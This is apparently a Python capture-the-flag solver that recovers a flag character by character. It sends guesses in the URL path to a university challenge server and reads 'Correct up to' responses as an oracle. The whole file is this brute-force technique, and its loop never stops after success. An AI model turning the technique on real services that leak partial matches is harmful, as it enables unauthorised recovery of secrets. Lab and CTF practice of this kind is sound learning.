import requests

BASE_URL = "http://cifrar.cju.ac.kr:25576/"
FLAG_PREFIX = "C"  # 플래그는 "C"로 시작
CHARACTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ{}_"
FLAG = ""

while True:
    for char in CHARACTERS:
        test_flag = FLAG + char
        url = BASE_URL + "/".join(test_flag)
        response = requests.get(url)
        
        if response.status_code == 200:
            print(f"Trying: {test_flag} -> {response.text}")
            if "Congratulations" in response.text:
                print(f"Flag found: {test_flag}")
                FLAG = test_flag
                break
            
            if "Correct up to" in response.text:
                FLAG += char
                print(f"Flag so far: {FLAG}")
                break
    else:
        print("No matching character found. Stopping.")
        break
